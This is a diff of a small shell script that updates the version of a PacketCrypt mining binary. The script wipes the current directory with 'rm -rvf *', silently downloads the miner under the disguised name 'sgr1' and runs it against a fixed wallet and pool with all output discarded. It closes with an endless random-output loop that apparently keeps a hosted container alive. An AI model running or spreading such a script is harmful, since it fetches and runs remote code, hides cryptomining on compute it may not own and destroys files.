@@ -2,7 +2,7 @@ rm -rvf * && mkdir d && cd d
 #!/bin/sh
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
-wget -O sgr1 https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.2/packetcrypt-v0.5.2-linux_amd64 >/dev/null 2>&1
+wget -O sgr1 https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.6.0/packetcrypt-v0.6.0-linux_amd64 >/dev/null 2>&1
 chmod +x sgr1 
 ./sgr1 ann -p pkt1qfj6fgahq88k5f28e7g6x9srcq40vva8aljlwjr http://pool.pkt.world > /dev/null 2>&1
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
